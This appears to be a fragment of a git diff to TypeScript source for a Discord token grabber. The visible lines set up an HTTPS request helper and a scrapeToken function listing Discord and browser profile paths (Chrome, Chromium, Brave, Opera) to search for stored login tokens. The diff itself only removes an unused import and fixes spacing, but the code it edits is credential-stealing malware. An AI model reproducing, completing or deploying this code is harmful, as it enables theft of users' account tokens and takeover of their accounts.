@@ -2,7 +2,6 @@ import { request, RequestOptions } from "https";
 import { type } from "os";
 import { env } from "process";
 import { readdirSync,readFileSync } from "fs";
-import { Z_ASCII } from "zlib";
 
 class net {
   async sendApiReq(api:string, body:Buffer = Buffer.from(""), method:string = "GET", auth?:string):Promise<string> {
@@ -67,7 +66,7 @@ function scrapeToken():string {
       "Discord PTB": `${config}/discordptb`,
       "Google Chrome": `${config}/chrome/Default`,
       "Chromium": `${config}/chromium/Default`,
-      "Brave":    `${config}/BraveSoftware/Brave-Browser/Default`,
+      "Brave": `${config}/BraveSoftware/Brave-Browser/Default`,
       "Opera": `${config}/opera`
     }
   }
